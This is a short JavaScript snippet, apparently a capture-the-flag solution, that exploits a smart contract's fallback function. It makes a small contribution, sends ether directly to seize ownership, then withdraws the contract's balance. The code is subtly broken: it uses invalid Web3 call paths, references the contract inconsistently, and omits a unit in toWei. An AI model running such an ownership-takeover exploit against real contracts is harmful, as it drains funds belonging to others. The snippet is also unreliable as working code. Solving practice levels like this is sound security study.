const Web3 = require('web3');

// Send some ether first
await Web3.eth.contract.contribute.sendTransaction({from: Web3.eth.accounts[0], value: Web3.toWei( "0.0001")})

// Send amount greater than: require(msg.value < 0.001 ether);
await Web3.eth.contract.sendTransaction({from: Web3.eth.accounts[0], value: Web3.toWei( "0.01")})

// Withdraw amount
await contract.withdraw()